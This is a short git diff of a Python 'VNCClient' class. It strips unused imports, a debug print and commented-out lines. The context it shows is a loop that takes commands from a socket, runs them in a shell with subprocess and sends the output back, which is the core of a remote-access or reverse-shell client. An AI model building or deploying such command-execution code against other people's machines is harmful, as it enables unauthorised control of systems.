@@ -1,11 +1,6 @@
-import pyautogui
 import socket
 from subprocess import check_output
-import base64
 import subprocess
-import json
-import time
-import os
 from lib.host import ipadd
 
 
@@ -25,12 +20,9 @@ class VNCClient:
                     self.logg = str(self.logg)
                     self.s.send(self.logg.encode())
                 else:
-                    print("EXEEEEEEE")
                     self.cmd_process = subprocess.run(
                         self.a, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                     self.cmd_process = self.cmd_process.stdout + self.cmd_process.stderr
-                # logg = check_output(self.a, shell=True)
-                # logg = str(logg)
                     self.s.send(self.cmd_process)
             elif self.a == 'X':
                 print(f"command = {self.a}")
